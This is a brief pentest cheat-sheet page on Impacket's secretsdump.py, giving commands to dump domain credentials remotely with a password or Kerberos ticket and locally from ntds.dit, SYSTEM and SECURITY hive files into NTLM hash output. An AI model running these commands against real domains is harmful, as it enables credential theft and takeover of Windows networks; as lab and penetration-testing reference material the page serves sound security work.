# Secretdump.py

## Remote

{% code overflow="wrap" %}
```bash
# With password 
secretsdump.py contoso.local/Administrator:Password0-@<DC IP Address> -output secretsdump_contoso_local

# With Kerberos ticket
impacket-secretsdump -no -k dc01.rebound.htb -just-dc-user administrator
```
{% endcode %}

## Local

{% code overflow="wrap" %}
```bash
# -ntds: ntds.dit
# -system: SYSTEM file
secretsdump.py -ntds ntds.dit -system ../registry/SYSTEM -hashes lmhash:nthash LOCAL -outputfile ntlm-extract

# -security: SECURITY file
impacket-secretsdump -system SYSTEM -security SECURITY -ntds ntds.dit local 
```
{% endcode %}

